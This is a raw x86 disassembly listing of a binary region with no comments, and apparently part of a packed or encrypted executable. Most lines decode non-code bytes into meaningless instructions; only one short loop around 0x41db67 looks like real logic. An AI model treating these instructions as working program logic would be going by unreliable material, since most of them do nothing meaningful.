  41d85e:	or     edi,DWORD PTR [ebx-0x448b04db]
  41d864:	test   BYTE PTR ds:0xa68eccf4,0xc8
  41d86b:	dec    edi
  41d86c:	std    
  41d86d:	aam    0x98
  41d86f:	cwde   
  41d870:	iret   
  41d871:	xor    esi,ebp
  41d873:	hlt    
  41d874:	xchg   ebx,eax
  41d875:	cwde   
  41d876:	(bad)  
  41d877:	scas   al,BYTE PTR es:[edi]
  41d878:	inc    esp
  41d879:	mov    ebp,0x3595e9ca
  41d87e:	out    0x18,al
  41d880:	iret   
  41d881:	shr    DWORD PTR [ecx+0x12],0x86
  41d885:	in     eax,dx
  41d886:	or     al,BYTE PTR [ebx+edx*4-0x3c87818a]
  41d88d:	cwde   
  41d88e:	mov    dh,0xa1
  41d890:	cmp    dl,BYTE PTR [eax-0x4ce9b043]
  41d896:	inc    ebx
  41d897:	or     BYTE PTR ds:0xc2831e3,0x6b
  41d89e:	push   ss
  41d89f:	mov    ds:0xeec1dbbe,al
  41d8a4:	repnz mov esp,0xfc5b484a
  41d8aa:	stc    
  41d8ab:	cmp    bh,BYTE PTR [ebx]
  41d8ad:	cmp    DWORD PTR [edi],eax
  41d8af:	mov    ebx,0xf6bb7cd6
  41d8b4:	mov    eax,0x52b6056d
  41d8b9:	pop    esi
  41d8ba:	push   ebx
  41d8bb:	mov    ds:0x25b86598,eax
  41d8c0:	frstor ss:[ecx+eax*8-0x1f]
  41d8c5:	dec    edi
  41d8c6:	sbb    bh,ch
  41d8c8:	fnstsw WORD PTR [edx]
  41d8ca:	bound  ecx,QWORD PTR [ebp-0x2f383b6e]
  41d8d0:	leave  
  41d8d1:	ins    DWORD PTR es:[edi],dx
  41d8d2:	or     DWORD PTR [ebx-0x7b],eax
  41d8d5:	pusha  
  41d8d6:	retf   0x57fa
  41d8d9:	add    al,0x85
  41d8db:	sbb    eax,0xbaf51f2b
  41d8e0:	test   cl,ch
  41d8e2:	mov    al,0x6b
  41d8e4:	mov    BYTE PTR [ebp-0x756cf512],bh
  41d8ea:	sbb    cl,bh
  41d8ec:	sub    dl,BYTE PTR [ecx]
  41d8ee:	sub    BYTE PTR [esi+0x759db3ea],0xa1
  41d8f5:	aam    0x60
  41d8f7:	pop    ecx
  41d8f8:	cdq    
  41d8f9:	adc    dh,BYTE PTR [edx+ecx*8+0x1d0386d7]
  41d900:	add    al,0xea
  41d902:	ret    
  41d903:	xchg   DWORD PTR [ecx],edi
  41d905:	test   BYTE PTR [ebp-0x6f],cl
  41d908:	cmp    BYTE PTR [ebx+0x64efb69c],dl
  41d90e:	mov    edx,0xaead4518
  41d913:	fnstenv [edi]
  41d915:	in     al,0x8b
  41d917:	shl    DWORD PTR [edi-0x58],cl
  41d91a:	xchg   BYTE PTR [esp+eax*8],dl
  41d91d:	sub    BYTE PTR [ebx+0x68],al
  41d920:	and    DWORD PTR [edi+eiz*4-0x54d80bf3],ebx
  41d927:	add    eax,0x8f789c38
  41d92c:	scas   eax,DWORD PTR es:[edi]
  41d92d:	or     bl,bl
  41d92f:	in     eax,0x20
  41d931:	rcr    DWORD PTR [ebx-0x7d46ba28],1
  41d937:	stos   BYTE PTR es:[edi],al
  41d938:	cmp    ah,BYTE PTR [ebx-0x52]
  41d93b:	jne    0x41d8bf
  41d93d:	push   edx
  41d93e:	pop    edi
  41d93f:	pop    ebx
  41d940:	lods   eax,DWORD PTR ds:[esi]
  41d941:	cwde   
  41d942:	push   ss
  41d943:	and    BYTE PTR [ebx+0x31],dh
  41d946:	test   eax,0x4b5fde7a
  41d94b:	and    eax,0x81c8c5a2
  41d950:	push   edi
  41d951:	or     dh,BYTE PTR [edi-0x18242673]
  41d957:	xor    eax,DWORD PTR [edi]
  41d959:	leave  
  41d95a:	or     eax,0xd95efaf6
  41d95f:	mov    edx,0x3a74d8c
  41d964:	sub    ebx,DWORD PTR [edi-0x30]
  41d967:	ret    0x16eb
  41d96a:	adc    edi,eax
  41d96c:	call   0xdfe3:0x79eff3a
  41d973:	mov    ebx,0xb918c068
  41d978:	pushf  
  41d979:	leave  
  41d97a:	jg     0x41d967
  41d97c:	mov    bh,0xf5
  41d97e:	sub    edx,DWORD PTR [esi+ebx*4]
  41d981:	jnp    0x41d934
  41d983:	pop    ebp
  41d984:	cmp    ch,BYTE PTR [ebp-0x1a]
  41d987:	xor    ch,BYTE PTR [edx]
  41d989:	xor    eax,0x9f3065c5
  41d98e:	mov    bl,BYTE PTR [eax-0x549746fd]
  41d994:	sbb    dl,BYTE PTR [edi-0x244af50a]
  41d99a:	retf   
  41d99b:	mov    ebx,0x3a1c6831
  41d9a0:	adc    BYTE PTR [esi-0x3fe67fc8],bh
  41d9a6:	and    BYTE PTR [edi-0xc52d50a],ah
  41d9ac:	scas   al,BYTE PTR es:[edi]
  41d9ad:	hlt    
  41d9ae:	sbb    eax,0x3be2f327
  41d9b3:	enter  0x404b,0x8
  41d9b7:	sbb    DWORD PTR [eax-0x10],eax
  41d9ba:	sbb    eax,0x6a57b314
  41d9bf:	mov    ds:0xc907262d,eax
  41d9c4:	adc    ecx,DWORD PTR [edx]
  41d9c6:	mov    bl,0x2d
  41d9c8:	jp     0x41d970
  41d9ca:	mov    cl,0x5e
  41d9cc:	lea    ebx,[ecx+0x71eee002]
  41d9d2:	inc    BYTE PTR [ebp+0x52bd0d77]
  41d9d8:	rcr    ebp,1
  41d9da:	sbb    al,0x34
  41d9dc:	pushf  
  41d9dd:	inc    edi
  41d9de:	push   edi
  41d9df:	das    
  41d9e0:	or     al,0x8f
  41d9e2:	imul   ebx,DWORD PTR [esi-0x5bcbf183],0xe
  41d9e9:	out    0xa,eax
  41d9eb:	hlt    
  41d9ec:	es sbb eax,0x65530615
  41d9f2:	or     eax,0xc8edb5b8
  41d9f7:	mov    ebp,0x29f845ab
  41d9fc:	xchg   esp,eax
  41d9fd:	cli    
  41d9fe:	retf   
  41d9ff:	test   DWORD PTR [ebp-0x9],esi
  41da02:	push   edx
  41da03:	pop    eax
  41da04:	or     esp,DWORD PTR cs:[edi]
  41da07:	inc    edx
  41da08:	add    DWORD PTR [eax+ecx*4+0x4f],ecx
  41da0c:	adc    edi,DWORD PTR [edx]
  41da0e:	cmp    edx,ebp
  41da10:	ss and esi,edi
  41da13:	icebp  
  41da14:	in     eax,dx
  41da15:	and    al,0x9f
  41da17:	es xor bl,dl
  41da1a:	outs   dx,BYTE PTR ds:[esi]
  41da1b:	(bad)  
  41da1d:	or     bh,al
  41da1f:	inc    esp
  41da20:	leave  
  41da21:	jecxz  0x41da27
  41da23:	xor    al,0x64
  41da25:	cmp    eax,0xcb59a5e2
  41da2a:	mov    eax,0xfc6cb9a6
  41da2f:	and    al,0xd3
  41da31:	fimul  DWORD PTR [esi+0x3825bf44]
  41da37:	push   ebp
  41da38:	inc    esp
  41da39:	jl     0x41daad
  41da3b:	mov    bh,0xdb
  41da3d:	mov    ebp,0xd37ae3f4
  41da42:	mov    cs,WORD PTR [edx-0x1a1dd281]
  41da48:	pop    ecx
  41da49:	push   esp
  41da4a:	ret    
  41da4b:	jo     0x41da20
  41da4d:	jb     0x41d9fc
  41da4f:	mov    dh,0x1d
  41da51:	mov    ecx,esi
  41da53:	outs   dx,BYTE PTR ds:[esi]
  41da54:	push   ecx
  41da55:	sbb    eax,0xce0a0f8e
  41da5a:	xor    BYTE PTR [esi],0xcb
  41da5d:	sbb    al,0xf7
  41da5f:	in     eax,0x76
  41da61:	retf   0xc383
  41da64:	xchg   edi,eax
  41da65:	test   DWORD PTR [esp+esi*2+0x1b2fafb0],edi
  41da6c:	leave  
  41da6d:	popa   
  41da6e:	fadd   DWORD PTR [edi-0x19dd1641]
  41da74:	cmp    al,bh
  41da76:	push   cs
  41da77:	fdivr  QWORD PTR [eax-0x3b18577f]
  41da7d:	leave  
  41da7e:	dec    edi
  41da7f:	add    eax,0x31f2d617
  41da84:	inc    edx
  41da85:	push   ebp
  41da86:	push   esi
  41da87:	dec    esi
  41da88:	jp     0x41dab3
  41da8a:	add    edx,DWORD PTR [ebp-0x6539cc3]
  41da90:	pop    ebx
  41da91:	mov    ebx,0x1d14072a
  41da96:	push   ecx
  41da97:	rcl    DWORD PTR [edi],0x46
  41da9a:	sti    
  41da9b:	popw   es
  41da9d:	and    al,0x20
  41da9f:	xchg   esp,eax
  41daa0:	inc    ecx
  41daa1:	add    al,0xcd
  41daa3:	mov    esp,0x1747d741
  41daa8:	and    eax,0xc9176ea0
  41daad:	ja     0x41daed
  41daaf:	fistp  QWORD PTR [esi-0x74fe79ab]
  41dab5:	mov    ch,0xaf
  41dab7:	cmp    BYTE PTR ds:0x7271df00,0x23
  41dabe:	push   ds
  41dabf:	test   eax,0x81547fd4
  41dac4:	arpl   WORD PTR [ebx],sp
  41dac6:	hlt    
  41dac7:	and    edx,DWORD PTR cs:[ecx-0x3c]
  41dacb:	adc    edi,edi
  41dacd:	sbb    ecx,DWORD PTR [ecx+0x4200fb53]
  41dad3:	fbld   TBYTE PTR [ebp+0x7c]
  41dad6:	pop    ss
  41dad7:	test   BYTE PTR [edi-0x1c68e3d5],ah
  41dadd:	cmp    al,0x17
  41dadf:	scas   al,BYTE PTR es:[edi]
  41dae0:	imul   eax,edi,0xffffffb4
  41dae3:	sub    eax,0xd65c20e1
  41dae8:	sub    al,0x80
  41daea:	lock mov ds:0x31df62fe,eax
  41daf0:	loope  0x41dac0
  41daf2:	mov    ebx,0x7b292dc8
  41daf7:	and    dh,BYTE PTR [edi-0x2208e93c]
  41dafd:	xlat   BYTE PTR ds:[ebx]
  41dafe:	icebp  
  41daff:	and    esp,edi
  41db01:	ficom  WORD PTR ds:0x4864b618
  41db07:	ins    DWORD PTR es:[edi],dx
  41db08:	xchg   DWORD PTR [esi+0x72],ecx
  41db0b:	std    
  41db0c:	jno    0x41db06
  41db0e:	rol    esi,1
  41db10:	cmp    edx,DWORD PTR [ebp-0x2e]
  41db13:	ss dec esi
  41db15:	mov    esi,0x6d8f2e8b
  41db1a:	scas   al,BYTE PTR es:[edi]
  41db1b:	sub    ch,BYTE PTR [edx+0x8db07ad]
  41db21:	pop    esi
  41db22:	cmp    al,0x2
  41db24:	ins    DWORD PTR es:[edi],dx
  41db25:	or     DWORD PTR ds:0x807846b9,ebx
  41db2b:	test   al,0xa4
  41db2d:	lea    edx,[ebx+0x17d57508]
  41db33:	fiadd  DWORD PTR [ecx-0x5cd91378]
  41db39:	add    BYTE PTR [edi+0x5a],0xa0
  41db3d:	add    al,0xe4
  41db3f:	daa    
  41db40:	xor    al,BYTE PTR [eax-0xc]
  41db43:	inc    ebx
  41db44:	sbb    DWORD PTR [edi],ecx
  41db46:	out    0x38,eax
  41db48:	push   eax
  41db49:	or     al,BYTE PTR [ecx-0x40]
  41db4c:	mov    eax,DWORD PTR [esi+edx*1-0x491994dc]
  41db53:	xchg   edi,eax
  41db54:	stos   BYTE PTR es:[edi],al
  41db55:	xchg   DWORD PTR [ebx+edi*2],eax
  41db58:	jb     0x41dafa
  41db5a:	scas   al,BYTE PTR es:[edi]
  41db5b:	xlat   BYTE PTR ds:[ebx]
  41db5c:	iret   
  41db5d:	and    al,0xbc
  41db5f:	cmp    al,0x6c
  41db61:	sbb    BYTE PTR [ebx+0x2581d455],cl
  41db67:	sub    eax,0x42a3
  41db6c:	add    BYTE PTR [eax],al
  41db6e:	add    cl,ch
  41db70:	sldt   WORD PTR [eax]
  41db73:	add    BYTE PTR [ebx],dh
  41db75:	fild   DWORD PTR [ebx]
  41db77:	sbb    eax,0x42a32d
  41db7c:	inc    ebx
  41db7d:	mov    DWORD PTR ds:0x42a32d,ebx
  41db83:	cmp    DWORD PTR ds:0x42a32d,0x14
  41db8a:	jae    0x41dbbf
  41db90:	cmp    DWORD PTR ds:0x42a32d,0x16
  41db97:	jne    0x41dbac
  41db9d:	push   DWORD PTR [ebp-0x10]
  41dba0:	push   DWORD PTR [ebp-0x18]
  41dba3:	push   DWORD PTR [ebp-0x18]
  41dba6:	call   DWORD PTR ds:0x425358
  41dbac:	jmp    0x41db74
  41dbb1:	mov    edi,DWORD PTR ds:0x42a339
  41dbb7:	mov    edi,DWORD PTR [edi]
  41dbb9:	sub    DWORD PTR ds:0x42a2c1,edi
  41dbbf:	mov    edi,DWORD PTR [ebp-0x4]
  41dbc2:	jmp    0x41e0d4
  41dbc7:	retf   0xd1c8
  41dbca:	into   
  41dbcb:	(bad)  
  41dbcd:	leave  
  41dbce:	aam    0xa0
  41dbd0:	cmp    ah,dl
  41dbd2:	sub    ebx,0xf56f936b
  41dbd8:	mov    cl,0x7f
  41dbda:	js     0x41dc4f
  41dbdc:	jl     0x41dc56
  41dbde:	js     0x41dbd2
  41dbe0:	cmp    dl,0x9c
  41dbe3:	xor    BYTE PTR [edi-0x149f6f38],bh
  41dbe9:	rol    ebp,0xef
  41dbec:	push   edx
  41dbed:	test   DWORD PTR [ecx+edx*8+0x29900c1a],esp
  41dbf4:	loope  0x41dc14
  41dbf6:	ds in  eax,0xa1
  41dbf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41dbfa:	arpl   dx,ax
  41dbfc:	rcl    dl,0x74
  41dbff:	aam    0x5c
  41dc01:	mov    dl,0xc9
  41dc03:	fwait
  41dc04:	stos   BYTE PTR es:[edi],al
  41dc05:	add    bh,BYTE PTR [esp+esi*2-0x9]
  41dc09:	sub    ah,bh
  41dc0b:	jmp    0x41db96
  41dc0d:	push   ss
  41dc0e:	sbb    esi,DWORD PTR [ecx+0x35]
  41dc11:	mov    edi,0x368f7cd6
  41dc16:	jns    0x41dc5a
  41dc18:	mov    ds:0x726a5b45,al
  41dc1d:	or     al,dh
  41dc1f:	mov    bl,0x1b
  41dc21:	ret    0x2f52
  41dc24:	jbe    0x41dc8c
  41dc26:	rcr    BYTE PTR [edx-0x58],cl
  41dc29:	cmp    eax,0xdfe0af35
  41dc2e:	push   ebp
  41dc2f:	dec    esp
  41dc30:	pop    eax
  41dc31:	push   ds
  41dc32:	repnz pop es
  41dc34:	push   cs
  41dc35:	sub    eax,0x25db1638
  41dc3a:	in     al,dx
  41dc3b:	lds    ecx,FWORD PTR [esi]
  41dc3d:	inc    edx
  41dc3e:	push   esp
  41dc3f:	mov    edx,0x8ed77980
  41dc44:	jno    0x41dcaa
  41dc46:	xchg   ebx,eax
  41dc47:	scas   eax,DWORD PTR es:[edi]
  41dc48:	icebp  
  41dc49:	mov    bl,0x65
  41dc4b:	rol    BYTE PTR [ecx-0x4e],0xbf
  41dc4f:	mov    eax,0xcc6b9771
  41dc54:	inc    ebp
  41dc55:	pop    ebp
  41dc56:	sbb    ah,ch
  41dc58:	dec    edx
  41dc59:	jae    0x41dbfc
  41dc5b:	les    ecx,FWORD PTR [ecx-0x2b]
  41dc5e:	aam    0xba
  41dc60:	fcom   DWORD PTR [eax-0x79b80481]
  41dc66:	mov    ebx,0x79b86b1
  41dc6b:	mov    dl,0xc8
  41dc6d:	loop   0x41dc97
  41dc6f:	loope  0x41dbf6
  41dc71:	leave  
  41dc72:	jno    0x41dc26
  41dc74:	sbb    eax,0x7a9486f0
  41dc79:	int3   
  41dc7a:	mov    eax,ds:0x9509e355
  41dc7f:	push   ecx
  41dc80:	mov    eax,0xebaed17c
  41dc85:	and    BYTE PTR [eax-0x79],bh
  41dc88:	mul    DWORD PTR [ebx]
  41dc8a:	out    dx,al
  41dc8b:	in     eax,dx
  41dc8c:	sub    BYTE PTR [edx],dh
  41dc8e:	push   ss
  41dc8f:	pusha  
  41dc90:	fild   QWORD PTR [eax+0x9]
  41dc93:	mov    ebp,edi
  41dc95:	loop   0x41dca5
  41dc97:	cmp    ecx,DWORD PTR [ecx+0x53]
  41dc9a:	test   al,0xe6
  41dc9c:	lahf   
  41dc9d:	or     BYTE PTR [esi+0x1e],ah
  41dca0:	xor    dh,bh
  41dca2:	xchg   esp,eax
  41dca3:	mov    cl,bl
  41dca5:	in     al,dx
  41dca6:	ss mov edi,0xae23c920
  41dcac:	add    al,0x3f
  41dcae:	cmp    ecx,DWORD PTR [ebp+esi*8+0x1d]
  41dcb2:	loop   0x41dc42
  41dcb4:	add    eax,0x8e0b342c
  41dcb9:	mov    ecx,0xe2e54222
  41dcbe:	jg     0x41dd1c
  41dcc0:	sti    
  41dcc1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41dcc2:	mov    dl,0x78
  41dcc4:	fdiv   DWORD PTR [ebp+0x79]
  41dcc7:	mov    ch,0xcf
  41dcc9:	sbb    esi,eax
  41dccb:	cwde   
  41dccc:	xchg   DWORD PTR [edx-0x5bf3783],esi
  41dcd2:	xor    edi,esi
  41dcd4:	add    BYTE PTR [edi],dh
  41dcd6:	inc    ecx
  41dcd7:	icebp  
  41dcd8:	bound  esi,QWORD PTR [esi]
  41dcda:	call   0x47f5:0xb74f8c31
  41dce1:	std    
  41dce2:	push   ebp
  41dce3:	ja     0x41dd34
  41dce5:	lods   al,BYTE PTR ds:[esi]
  41dce6:	mov    edi,0xb1d0e724
  41dceb:	mov    esi,0x86a7965e
  41dcf0:	mov    esp,0xf29119b6
  41dcf5:	inc    eax
  41dcf6:	or     eax,0x25c1eb26
  41dcfb:	xchg   esi,eax
  41dcfc:	sar    BYTE PTR [ebx-0x5517518e],cl
  41dd02:	jecxz  0x41dcd9
  41dd04:	shl    BYTE PTR [ecx+0x2],0x4b
  41dd08:	out    dx,eax
  41dd09:	push   ecx
  41dd0a:	pop    edi
  41dd0b:	pop    esi
  41dd0c:	mov    eax,0xcfa960e
  41dd11:	jne    0x41dcfd
  41dd13:	ret    0x69b7
  41dd16:	push   ebp
  41dd17:	cmp    al,0xcc
  41dd19:	call   0xe5e1e0a2
  41dd1e:	stos   DWORD PTR es:[edi],eax
  41dd1f:	scas   al,BYTE PTR es:[edi]
  41dd20:	mov    esi,0x6ac6188
  41dd25:	(bad)  
  41dd26:	and    DWORD PTR [ebx-0x3b],esp
  41dd29:	xchg   ebx,eax
  41dd2a:	push   esp
  41dd2b:	jnp    0x41dd53
  41dd2d:	xor    ebx,edx
  41dd2f:	test   bh,ah
  41dd31:	mov    ds:0x9afbdf2b,al
  41dd36:	mov    eax,0x405fc8b5
  41dd3b:	sub    al,0xc1
  41dd3d:	mov    eax,ds:0x1a98f118
  41dd42:	add    esi,DWORD PTR [esi+eiz*1]
  41dd45:	add    BYTE PTR [edx],ch
  41dd47:	into   
  41dd48:	sti    
  41dd49:	stc    
  41dd4a:	shr    BYTE PTR [edx-0xe7cca1d],1
  41dd50:	dec    edx
  41dd51:	inc    esi
  41dd52:	inc    esi
  41dd53:	jmp    0x41dcd7
  41dd55:	push   esp
  41dd56:	dec    esp
  41dd57:	or     cl,bl
  41dd59:	xor    eax,0xbbb8f95
  41dd5e:	inc    ebx
  41dd5f:	mov    edx,0x2b08fd0d
  41dd64:	daa    
  41dd65:	adc    al,0x38
  41dd67:	sahf   
  41dd68:	dec    edx
  41dd69:	xor    ch,BYTE PTR [eax]
  41dd6b:	sahf   
  41dd6c:	ins    DWORD PTR es:[edi],dx
  41dd6d:	ret    0x1490
  41dd70:	mov    dh,0xd7
  41dd72:	jg     0x41dd18
  41dd74:	cmc    
  41dd75:	inc    edx
  41dd76:	imul   eax,esp,0xffffffb6
  41dd79:	pop    esp
  41dd7a:	pop    ss
  41dd7b:	lds    esi,FWORD PTR [ebp+esi*8+0x2f]
  41dd7f:	retf   
  41dd80:	xchg   BYTE PTR [ecx+esi*4-0x3f],dh
  41dd84:	enter  0xcfad,0x25
  41dd88:	inc    esp
  41dd89:	dec    esp
  41dd8a:	loopne 0x41dd52
  41dd8c:	mov    ds:0x65106783,eax
  41dd91:	clc    
  41dd92:	jo     0x41ddfc
  41dd94:	ror    BYTE PTR [eax+0x19339966],cl
  41dd9a:	dec    ebx
  41dd9b:	cs jle 0x41dd2b
  41dd9e:	stos   DWORD PTR es:[edi],eax
  41dd9f:	std    
  41dda0:	dec    eax
  41dda1:	mov    ds:0xc0949c0d,eax
  41dda6:	into   
  41dda7:	(bad)  
  41dda8:	stc    
  41dda9:	(bad)  
  41ddaa:	popa   
  41ddab:	dec    ebx
  41ddac:	mov    cl,0xa2
  41ddaf:	push   ebp
  41ddb0:	enter  0xb11e,0xc2
  41ddb4:	jbe    0x41dd7f
  41ddb6:	(bad)  
  41ddb8:	(bad)
  41ddbb:	hlt    
  41ddbc:	push   ecx
  41ddbd:	out    0xf3,al
  41ddbf:	push   ecx
  41ddc0:	loope  0x41dd50
  41ddc2:	mov    edi,0xb5550c61
  41ddc7:	hlt    
  41ddc8:	and    bl,BYTE PTR [edi]
  41ddca:	mov    BYTE PTR [ebp+0x3e],bl
  41ddcd:	and    edi,DWORD PTR [ebx+ebp*8]
  41ddd0:	test   al,0x86
  41ddd2:	jno    0x41dd9c
  41ddd4:	xor    edi,DWORD PTR [edi]
  41ddd6:	call   0x4d01af32
  41dddb:	push   ebx
  41dddc:	dec    esp
  41dddd:	aam    0xf0
  41dddf:	xchg   ah,dl
  41dde1:	and    esp,DWORD PTR [edx]
  41dde3:	lods   eax,DWORD PTR ds:[esi]
  41dde4:	xchg   esi,eax
  41dde5:	pop    ss
  41dde6:	mov    eax,0xd8e91199
  41ddeb:	sbb    al,0xea
  41dded:	(bad)  
  41ddee:	(bad)  
  41ddef:	jno    0x41ddc3
  41ddf1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41ddf2:	fsubr  QWORD PTR [edx+ebx*2-0x1]
  41ddf6:	push   0xf7ae55e4
  41ddfb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41ddfc:	js     0x41de50
  41ddfe:	es pop ecx
  41de00:	adc    bh,BYTE PTR ds:0x2ef2945c
  41de06:	int    0xa5
  41de08:	(bad)  
  41de09:	(bad)  
  41de0b:	xchg   ebx,eax
  41de0c:	jg     0x41de17
  41de0e:	push   ss
  41de0f:	mov    cl,0xfd
  41de11:	clc    
  41de12:	mov    dl,0xd3
  41de14:	cmovne edx,DWORD PTR [ebp+edi*1+0x50]
  41de19:	jae    0x41dde8
  41de1b:	aam    0x32
  41de1d:	xchg   esp,eax
  41de1e:	jmp    DWORD PTR [edx+0x3a]
  41de21:	test   al,0x5e
  41de23:	sub    BYTE PTR [esi+0x42333224],ch
  41de29:	or     ecx,ebp
  41de2b:	pushf  
  41de2c:	loopne 0x41de18
  41de2e:	sbb    BYTE PTR [edi-0xe],0xba
  41de32:	mov    edx,0xdf02ce5
  41de37:	jo     0x41ddd0
  41de39:	sbb    eax,0x6e19168c
  41de3e:	adc    esi,edi
  41de40:	ret    
  41de41:	dec    eax
  41de42:	adc    DWORD PTR [esi],eax
  41de44:	mov    ecx,0x774a3776
  41de49:	dec    ebp
  41de4a:	pop    ds
  41de4b:	sub    dl,BYTE PTR [edx]
  41de4d:	dec    esi
  41de4e:	mov    al,0x3e
  41de50:	mov    ds:0xbe9ee261,eax
  41de55:	jb     0x41de06
  41de57:	jmp    0x5b1af38f
  41de5c:	xchg   BYTE PTR [edx],bh
  41de5e:	dec    edi
  41de5f:	pop    eax
  41de60:	pusha  
  41de61:	aaa    
  41de62:	outs   dx,BYTE PTR ds:[esi]
  41de63:	sbb    DWORD PTR [esi+ecx*4],ebx
  41de66:	fld    TBYTE PTR [ecx-0xf]
  41de69:	ret    0x436b
  41de6c:	div    DWORD PTR ds:0x73123926
  41de72:	push   es
  41de73:	pusha  
  41de74:	data16 data16 (bad) 
  41de77:	test   BYTE PTR [ecx+0x2f],0x5f
  41de7b:	adc    eax,0x651cce1e
  41de80:	dec    eax
  41de81:	sbb    DWORD PTR [ebp+0xa],ecx
  41de84:	cmc    
  41de85:	and    ah,bh
  41de87:	xor    DWORD PTR [ebp-0x24],edx
  41de8a:	and    bl,BYTE PTR [eax]
  41de8c:	outs   dx,BYTE PTR ds:[esi]
  41de8d:	mov    edx,0x941f473e
  41de92:	jno    0x41de1b
  41de94:	addr16 nop
  41de96:	cmp    DWORD PTR [esi],ebp
  41de98:	stos   BYTE PTR es:[edi],al
  41de99:	cmp    ebx,esi
  41de9b:	stos   DWORD PTR es:[edi],eax
  41de9c:	add    bl,dh
  41de9e:	mov    ds:0x242440db,al
  41dea3:	sub    DWORD PTR [edi-0x2a],esi
  41dea6:	sub    edi,0xffffffd5
  41dea9:	clc    
  41deaa:	or     al,0x21
  41deac:	jle    0x41deb7
  41deae:	cwde   
  41deaf:	dec    edi
  41deb0:	pop    ds
  41deb1:	jmp    0xfb19b7f4
  41deb6:	test   eax,0x8f18488a
  41debb:	pop    ds
  41debc:	push   ds
  41debd:	stc    
  41debe:	push   ds
  41debf:	mov    eax,0xcb6bf8c
  41dec4:	loop   0x41dea8
  41dec6:	sbb    DWORD PTR [ebx],0xffffffe4
  41dec9:	sbb    al,0x46
  41decb:	cmc    
  41decc:	mov    dh,0x77
  41dece:	fldcw  WORD PTR [ecx+0x4aaf9c6]
  41ded4:	ins    DWORD PTR es:[edi],dx
  41ded5:	ss aad 0x8f
  41ded8:	(bad)  
  41ded9:	sbb    BYTE PTR [ebp-0x5560e449],dl
  41dedf:	imul   edi,edi,0x6a
  41dee2:	or     eax,0x1d4c4326
  41dee7:	and    cl,dh
  41dee9:	inc    esi
  41deea:	jbe    0x41de91
  41deec:	cmp    al,0x6a
  41deee:	mov    fs:0x70fb3eb0,eax
  41def4:	mov    WORD PTR [edx+0x21618f43],ss
  41defa:	loope  0x41deb6
  41defc:	sar    esi,0x39
  41deff:	adc    eax,0x6d97008
  41df04:	mov    WORD PTR [ecx-0x46128c2b],ds
  41df0a:	std    
  41df0b:	and    eax,0x9afa9c70
  41df10:	aas    
  41df11:	and    BYTE PTR [ebx],bh
  41df13:	cli    
  41df14:	das    
  41df15:	cdq    
  41df16:	mov    dh,0x57
  41df18:	push   esp
  41df19:	dec    ebp
  41df1a:	jmp    0x214bf3f4
  41df1f:	pop    ds
  41df20:	jae    0x41ded7
  41df22:	sbb    eax,0xbb73b2f5
  41df27:	mov    ds:0xb0bd5a,eax
  41df2c:	or     al,0xf5
  41df2e:	mov    edx,0xb1b11194
  41df33:	cmp    BYTE PTR [esi+0x43e139b7],ah
  41df39:	imul   ebx,DWORD PTR [edi+0x219ffb9d],0xffffffe6
  41df40:	mov    esp,0x3c89fc95
  41df45:	inc    esi
  41df46:	imul   eax,DWORD PTR [edi+0x6],0xecd04266
  41df4d:	fwait
  41df4e:	enter  0x94d5,0x68
  41df52:	into   
  41df53:	xchg   edi,eax
  41df54:	mov    ah,BYTE PTR [edi+0x5e70a47d]
  41df5a:	rcl    BYTE PTR [ebx-0x48b0ecaa],cl
  41df60:	cdq    
  41df61:	inc    edi
  41df62:	sbb    DWORD PTR [eax-0x36],ecx
  41df65:	inc    ecx
  41df66:	aad    0xc9
  41df68:	xchg   BYTE PTR [edi-0x4cb69773],dh
  41df6e:	jg     0x41df5f
  41df70:	push   ebx
  41df71:	cmp    ecx,DWORD PTR [esi+0x4c5045d6]
  41df77:	sub    bl,BYTE PTR es:[esi+esi*1+0x374bc357]
  41df7f:	dec    eax
  41df80:	sub    BYTE PTR [esi+edx*1-0x12],0xfa
  41df85:	sub    al,0x74
  41df87:	sub    ch,BYTE PTR [esp+ecx*4]
  41df8a:	movups XMMWORD PTR [esi],xmm4
  41df8d:	loope  0x41dfef
  41df8f:	into   
  41df90:	push   es
  41df91:	call   0x26501cb4
  41df96:	cmp    dl,ah
  41df98:	inc    edi
  41df99:	xchg   ebp,eax
  41df9a:	out    0xfc,al
  41df9c:	mov    cl,0x53
  41df9e:	xor    DWORD PTR [ebx+edi*2+0x3],ebx
  41dfa2:	out    0xcc,al
  41dfa4:	std    
  41dfa5:	mov    esp,0x1804698c
  41dfaa:	lock jo 0x41df63
  41dfad:	and    eax,0xbb2adfec
  41dfb2:	aas    
  41dfb3:	gs mov al,0x6d
  41dfb6:	aam    0x36
  41dfb8:	xor    bl,BYTE PTR [ecx-0x13]
  41dfbb:	or     eax,0xe4930a51
  41dfc0:	add    eax,0xda038acd
  41dfc5:	mov    al,0x45
  41dfc7:	pop    ss
  41dfc8:	mov    ebp,0xb8235423
  41dfcd:	neg    DWORD PTR [ebp+0x78a8c8e4]
  41dfd3:	test   eax,0xeea4358
  41dfd8:	xor    al,0x75
  41dfda:	mov    eax,0x70e66a47
  41dfdf:	xchg   ebp,eax
  41dfe0:	loop   0x41dfae
  41dfe2:	aaa    
  41dfe3:	sub    edx,esi
  41dfe5:	push   0x6f1b481d
  41dfea:	adc    DWORD PTR [edx+0x220631b4],eax
  41dff0:	(bad)  [edi+0x26]
  41dff3:	in     al,0x8a
  41dff5:	test   eax,0x82343b05
  41dffa:	mov    eax,eax
  41dffc:	sub    ebp,ecx
  41dffe:	xchg   esi,eax
  41dfff:	and    bh,ch
  41e001:	and    ch,BYTE PTR [ecx]
  41e003:	cdq    
  41e004:	xchg   edx,eax
  41e005:	data16 lods al,BYTE PTR ds:[esi]
  41e007:	dec    esi
  41e008:	lock xor al,BYTE PTR [edi+0x18bccdb]
  41e00f:	and    al,BYTE PTR [edi-0x3f]
  41e012:	dec    esi
  41e013:	lds    eax,FWORD PTR [ecx-0x56af3fe5]
  41e019:	stos   BYTE PTR es:[edi],al
  41e01a:	push   esp
  41e01b:	push   ds
  41e01c:	ret    
  41e01d:	lods   eax,DWORD PTR ds:[esi]
  41e01e:	pop    edi
  41e01f:	jmp    0xdfb1c8a
  41e024:	sbb    eax,DWORD PTR [esi-0xe]
  41e027:	jb     0x41dfce
  41e029:	arpl   WORD PTR [ecx],dx
  41e02b:	mov    BYTE PTR [edx],ah
  41e02d:	neg    WORD PTR [esi+edi*8]
  41e031:	icebp  
  41e032:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41e033:	bswap  eax
